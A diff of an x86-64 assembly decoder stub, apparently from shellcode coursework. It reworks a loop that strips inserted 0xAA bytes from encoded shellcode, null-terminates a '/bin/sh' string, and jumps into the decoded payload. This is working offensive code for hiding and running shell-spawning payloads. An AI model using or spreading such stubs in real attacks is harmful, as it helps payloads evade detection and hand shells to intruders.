@@ -6,7 +6,7 @@
 ;
 ; NOTE : Just add the shellcode (comma separated values) after the label 'shellcode'
 ;
-; SHELLCODE LENGTH = 
+; SHELLCODE LENGTH = 112 bytes 
 
 
 
@@ -22,26 +22,30 @@ _start:
 
 Main:
 
-	lea rsi, [rel encoded_shellcode]
-	xor rdi, rdi
-	;mov	rcx, rdi
-	add rdi, 0x1			; Points to actual shellcode bytes
+	lea rdi, [rel encoded_shellcode]
+	xor rsi, rsi
+	mov	rcx, rsi
+	add rsi, 0x1			; Points where actual shellcode bytes are to be placed
 	xor rax, rax			
 	add rax, 0x2			; Points to inserted bytes (0xAA's)
 	
-	;mov	rcx, 29				; Half the Length of encoded shellcode minus 1 (-1)
+	mov	cl, 29				; Half the Length of encoded shellcode minus 1 (-1)
 	
 		
 decode:
 	
-	mov	bl, byte [rsi + rax]
-	xor bl, 0xaa
-	jnz	short encoded_shellcode	
-	mov	byte [rsi + rdi], bl 
-	inc rdi
+	mov	bl, byte [rdi + rax]
+	;xor bl, 0xaa
+	;jnz	short encoded_shellcode	
+	mov	byte [rdi + rsi], bl 
+	inc rsi
 	add rax, 0x2
-	jmp short decode
+	loop decode
 
+	mov	BYTE [rdi + 30], cl	; place a NULL byte at the end of the decoded shellcode
+								; as the string '/bin/sh' should end with 0x00
+	
+	jmp	rdi					; Transfer control to the decoded shellcode
 	
 
 
